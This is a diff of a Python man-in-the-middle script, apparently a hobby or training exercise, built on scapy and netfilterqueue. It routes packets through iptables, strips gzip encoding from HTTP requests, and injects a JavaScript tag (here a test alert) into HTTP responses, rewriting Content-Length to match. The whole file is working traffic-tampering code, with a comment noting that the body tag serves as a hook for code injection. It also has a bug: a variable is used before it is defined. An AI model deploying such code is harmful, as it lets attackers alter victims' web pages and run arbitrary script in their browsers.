@@ -9,18 +9,9 @@ import re
 #Accept-Encoding: gzip, deflate in http request spits outs '\xff\x00\xff\xff\xff\x00\xff\xff\xff' raw data
 #we'll use regex to modify zipped html content
 #Accept-Encoding:.*?\\r\\n //matches up to carriage return and first newline
+#js alert--> <script>alert('test');</script></body> //need to adjust content length to insert js at end of body tag 
+#will (should) always be a  </body> in the page source, shoud always be able to use as a hook for code injection
 
-
-
-
-'''
-def get_args():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-u','--url-download',dest='url',help='Enter url to a executable download link to replace with target download')
-    options = parser.parse_args()
-    return options
-opt = get_args()
-'''
 
 def iptable_conf():
     pipecmd_lm = 'iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001'
@@ -47,29 +38,52 @@ def set_load(rpkt,load):
 
 
 def process_packet(pkt):
+    load = sc_pkt[sc.Raw].load
+    injection_script = ("<script>alert('test');</script></body>")
     sc_pkt = sc.IP(pkt.get_payload())
     if sc_pkt.haslayer(sc.TCP):
         if sc_pkt.haslayer(sc.Raw):
+            
+            
             if sc_pkt[sc.TCP].dport == 80:
-                load = sc_pkt[sc.Raw].load
-                load_decoded = load.decode('utf-8')
-                print('[+] HTTP Request w/ gzip')
-                print(load_decoded)
-                change_load = re.sub("Accept-Encoding:.*?\\r\\n",'',load_decoded) #replaces with null string, use our function set_load to modify load 
-                new_sc_pkt = set_load(sc_pkt,change_load)
-                print('[+] HTTP Request w/o gzip')
-                new_load = new_sc_pkt[sc.Raw].load
-                print(new_load.decode('utf-8'))
+                print('[+] HTTP Request')
+                load = load.decode('utf-8','ignore')
+                load = re.sub("Accept-Encoding:.*?\\r\\n",'',load) #replaces with null string, use our function set_load to modify load 
+                '''#                       \
+                print('Original load: \n')# \
+                print(sc_pkt[sc.Raw].load)#  | for troubleshooting
+                print('Modified load: \n')# /
+                print(load)#               /
+                '''#
+            
             elif sc_pkt[sc.TCP].sport == 80: 
                 print('[+] HTTP Response')
-                response = sc_pkt[sc.Raw].load 
-                print(response.decode('utf-8'))
+                load = sc_pkt[sc.Raw].load.decode('utf-8','ignore')
+                load = load.replace("</body>",injection_script)
+                content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', load)
+                if content_length_search:
+                    content_length = content_length_search.group(1) #returning second group which is the actual content length number
+                    new_content_length = int(content_length) + len(injection_script) #adding length of chars in injection string 
+                    load = load.replace(content_length,str(new_content_length))
+                    print('original content length:',content_length,'\nmodified content length:',new_content_length)
+                '''                         
+                print('Original load: \n')
+                print(sc_pkt[sc.Raw].load)   # for troubleshooting
+                print('Modified load: \n')
+                print(load)
+                '''
+            
+            
+            if load != sc_pkt[sc.Raw].load:
+                new_sc_pkt = set_load(sc_pkt,load)
+                pkt.set_payload(bytes(new_sc_pkt)) #bytes ??
+    
+    
     pkt.accept()
 
 
 try:
     iptable_conf()
-    
     print("iptables configured\n\n")
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(1001, process_packet)
